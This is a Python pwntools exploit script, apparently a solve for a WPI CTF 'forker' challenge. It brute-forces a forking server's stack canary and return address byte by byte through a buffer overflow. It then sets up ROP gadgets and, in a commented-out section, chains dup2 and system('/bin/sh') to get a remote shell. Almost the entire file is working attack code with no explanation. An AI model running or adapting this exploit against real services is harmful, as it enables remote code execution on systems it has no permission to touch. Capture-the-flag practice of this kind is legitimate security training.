from pwn import *
import sys, time

### Config ###
filename = './forker.level3'
rhost = "forker3.wpictf.xyz"
rport = 31337

### Binary ###
context.binary = filename
binary = ELF(filename)

### Context ###
#context.arch=elf.arch
context.log_level='INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

### Def function area ###


### Start exploit ###
if len(sys.argv) == 1:
    rhost = "localhost"
    p = remote("localhost", rport)
else:
    p = remote(rhost,rport)

canary = ''
saved_canary = ''

# canary leak

while True:
    for i in xrange(8):
        for byte in xrange(0x100):
            if byte == 0x0a:
                continue
            canary = saved_canary + p8(byte)
            p.recvuntil("Password:")
            payload = "A" * 72
            payload += canary
            p.sendline(payload)
            try:
                res = p.recv()
                if "You failed to get a correct password!" in res:
                    log.info("found : " + hex(byte))
                    saved_canary += p8(byte)
                    p.close()
                    p = remote(rhost, rport)
                    break
            except:
                canary = saved_canary
                log.info("try : " + hex(byte))
                #log.info("fail canary : " + saved_canary)
                p.close()
                p = remote(rhost, rport)
    log.info(saved_canary.encode("hex"))
    break

#local_canary = "002566ab2a1243e7".decode("hex")        # local
local_canary = "00c381d1638b2bce".decode("hex")     # remote


# binary leak

binary_base = ''
saved_binary_base = '\xf1'

# 0x55fb0d2319f1

offset = 0x78
while True:
    for i in xrange(5):
        for byte in xrange(0x100):
            if byte == 0x0a:
                continue
            binary_base = saved_binary_base + p8(byte)
            p.recvuntil("Password:")
            payload = "A" * 72
            payload += saved_canary
            payload += p32(4) * ((0x78 - len(payload))/4)
            payload += binary_base
            # leak ret
            p.sendline(payload)

            try:
                res = p.recv(timeout=2)
                print res
                if "You failed to get a correct password!" in res:
                    log.info("found : " + hex(byte))
                    saved_binary_base += p8(byte)
                    p.close()
                    p = remote(rhost, rport)
                    break
            except:
                binary_base = saved_binary_base
                #log.info("fail bbase : " + hex(saved_binary_base))
                log.info("fail bbase : " + hex(byte))
                p.close()
                p = remote(rhost, rport)
    log.info(saved_binary_base.encode("hex"))

    break

base_offset = 2545
base = 0x55fb0d2319f1 - base_offset      # local
#base = int("0x"+"f119230dfb55".decode("hex")[::-1], 0) - base_offset      # remote

pop1rdi = base + 0xc93        # : pop rdi; ret;
pop2rsi = base + 0xc91        # : pop rsi; pop r15; ret;
ret = base + 0xc24
dprintf = base + 0x850
puts_got = base + 0x202070

# leak
'''
payload = "A" * 72 + local_canary + p64(ret) * 8
payload += p64(pop1rdi) + p64(4)
payload += p64(pop2rsi) + p64(puts_got) * 2
payload += p64(dprintf)
p.recvuntil("Password:")
p.sendline(payload)

leak = u64(p.recv(6).ljust(8, "\x00"))
print hex(leak)

leak = 0x7f95e083f460
libc_base = leak - 0x78460
system = libc_base + 0x47dc0
dup2 = libc_base + 0x1048e0
binsh = libc_base + 0x1a3f20

# exploit

buf = "A" * 72 + local_canary + p64(ret) * 8
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(0) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(1) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(binsh) + p64(system)
p.sendline(buf)
'''
p.interactive()
